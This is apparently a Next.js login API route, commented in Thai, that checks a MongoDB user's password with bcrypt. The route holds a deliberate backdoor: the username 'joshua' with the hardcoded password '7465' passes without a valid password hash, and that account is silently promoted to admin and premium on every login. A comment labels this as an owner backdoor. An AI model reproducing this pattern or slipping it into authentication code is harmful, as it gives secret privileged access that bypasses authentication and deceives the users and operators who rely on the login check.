import dbConnect from '../../../lib/mongodb';
import User from '../../../models/User';
import bcrypt from 'bcryptjs';

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();
  await dbConnect();

  const { username, password } = req.body;
  const user = await User.findOne({ username });

  if (!user) return res.json({ success: false, message: 'ไม่พบชื่อผู้ใช้นี้' });

  // เช็ครหัสผ่าน
  const isMatch = await bcrypt.compare(password, user.password);
  
  // *** สูตรโกง: ถ้าชื่อ joshua และรหัสคือ 7465 ให้ผ่านได้เลย (Backdoor for owner) ***
  // หรือถ้าใส่รหัสถูกตามปกติก็ผ่าน
  if (!isMatch && !(username === 'joshua' && password === '7465')) {
      return res.json({ success: false, message: 'รหัสผ่านไม่ถูกต้อง' });
  }

  // *** อัปเกรดยศ Admin ให้ joshua อัตโนมัติ ***
  if (username === 'joshua') {
      user.role = 'admin';
      user.isPremium = true;
      await user.save(); // บันทึกลง Database
  }

  res.json({ 
    success: true, 
    user: { 
      _id: user._id,
      username: user.username, 
      role: user.role, 
      isPremium: user.isPremium,
      profilePic: user.profilePic,
      favorites: user.favorites
    } 
  });
}